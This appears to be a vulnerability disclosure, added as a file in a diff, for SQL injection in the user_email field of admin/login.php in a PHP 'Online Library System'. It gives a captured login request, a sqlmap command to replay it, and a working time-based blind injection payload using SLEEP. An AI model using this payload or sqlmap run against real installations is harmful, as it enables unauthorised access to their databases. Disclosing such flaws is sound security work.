@@ -1,0 +1,45 @@
+BUG_AUTHOR:LIU WEIYU
+
+Online Library System - SQL Injection on (admin/login.php user_email parameter) 
+
+Vendor Homepage:
+https://www.sourcecodester.com/php/14816/online-library-system-phpmysqli-full-source-code.html
+
+Version:V1.0
+
+Tested on: PHP, Apache, MySQL
+
+Affected Page:
+admin/login.php
+On this page, user_email parameter is vulnerable to SQL Injection Attack 
+
+Proof of vulnerability(Verify using the sqlmap tool):
+
+Requests:
+POST /OLS/admin/login.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+Content-Length: 145
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Language: zh-CN,zh;q=0.9
+Cache-Control: max-age=0
+Content-Type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=g883r0l08f296hfd9582abk9v0
+Origin: http://localhost
+Referer: http://localhost/OLS/admin/login.php
+Upgrade-Insecure-Requests: 1
+Accept-Encoding: gzip
+
+btnLogin=Login&user_email=admin&user_pass=admin
+
+-> sqlmap -r 1.txt(above request package) --batch
+
+Output:
+---
+Parameter: user_email (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: btnLogin=Login&user_email=admin' AND (SELECT 6490 FROM (SELECT(SLEEP(5)))xRfw) AND 'laoz'='laoz&user_pass=admin
+---
+[14:19:21] [INFO] the back-end DBMS is MySQL
+
